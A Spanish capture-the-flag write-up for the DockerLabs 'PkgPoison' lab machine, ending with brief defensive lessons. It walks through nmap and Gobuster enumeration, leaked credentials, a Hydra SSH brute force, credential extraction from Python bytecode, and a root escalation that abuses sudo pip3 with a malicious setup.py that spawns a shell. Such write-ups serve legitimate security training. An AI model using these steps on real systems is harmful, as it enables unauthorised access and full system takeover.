# PkgPoison — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** RSA  
**Fecha de creación:** 30/05/2025  
**Técnicas:** Gobuster · Hydra · SSH · Python bytecode analysis · Strings · pip3 sudo abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Fuerza bruta SSH — Hydra](#3-fuerza-bruta-ssh--hydra)
4. [Obtención de credenciales admin](#4-obtención-de-credenciales-admin)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh pkgpoison.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/notes
```

Exploramos el contenido:

```text
http://172.17.0.2/notes/note.txt
```

Contenido:

```text
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```

Obtenemos:

```text
Usuario: dev
Contraseña: developer123
```

---

## 3. Fuerza bruta SSH — Hydra

También es posible encontrar la contraseña mediante Hydra:

```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: dev
password: developer123
```

Accedemos por SSH:

```bash
ssh dev@172.17.0.2
```

---

## 4. Obtención de credenciales admin

Investigando el sistema encontramos scripts Python:

```bash
cd /opt/scripts
ls
```

Resultado:

```text
secret.pyc
```

Entramos al directorio cacheado:

```bash
cd __pycache__
ls
```

Utilizamos `strings` sobre el bytecode compilado:

```bash
strings secret.cpython-38.pyc
```

Encontramos información sensible:

```text
username
password
admin
```

También aparece:

```text
Password:
To run command as administrator (user "root"), use "sudo <command>".
```

Probamos las credenciales obtenidas:

```bash
su admin
```

Acceso correcto.

Comprobamos sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/pip3 install *
```

---

## 5. Escalada de privilegios

Consultamos GTFOBins para `pip`.

Creamos un paquete malicioso:

```bash
TF=$(mktemp -d)
```

```bash
echo 'import os; os.execl("/bin/sh", "sh", "-c", "sh <$(tty) >$(tty) 2>$(tty)")' > $TF/setup.py
```

Ejecutamos como root:

```bash
sudo pip3 install $TF
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Credenciales débiles expuestas | Acceso inicial |
| Información sensible en bytecode Python | Descubrimiento de credenciales |
| pip3 ejecutable con sudo | Escalada a root |

**Para defenderse:**

- No almacenar credenciales en texto plano.
- Proteger archivos `.pyc` sensibles.
- Restringir permisos sudo peligrosos.
- Aplicar políticas robustas de contraseñas.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
